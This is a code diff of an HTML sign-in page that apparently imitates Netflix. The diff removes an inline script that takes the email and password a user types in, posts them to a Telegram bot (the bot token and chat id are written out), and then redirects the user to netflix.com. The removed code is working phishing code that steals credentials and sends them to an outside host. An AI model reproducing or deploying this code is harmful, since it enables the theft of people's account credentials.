@@ -35,7 +35,7 @@
                 </div>
                 
                 <div>
-                    <button class="signin-button" onclick="signin(); return false;">Sign In</button>
+                    <button class="signin-button">Sign In</button>
                 </div>
                 <div class="remember-flex">
                     <div>
@@ -104,20 +104,5 @@
         </div>
     </div>
     <script src="js/script.js"></script>
-    <script>function signin(ev){
-            ev.preventDefault();
-            console.log("signing in...");
-                const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${inputEmail.value}:${inputPassword.value}`
-    fetch(url, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: ''
-    }).then(res => {
-        console.log("Request complete! response:", res);
-    });
-            location.href = "https://www.netflix.com";
-            return false;
-        }
-    </script>
 </body>
 </html>
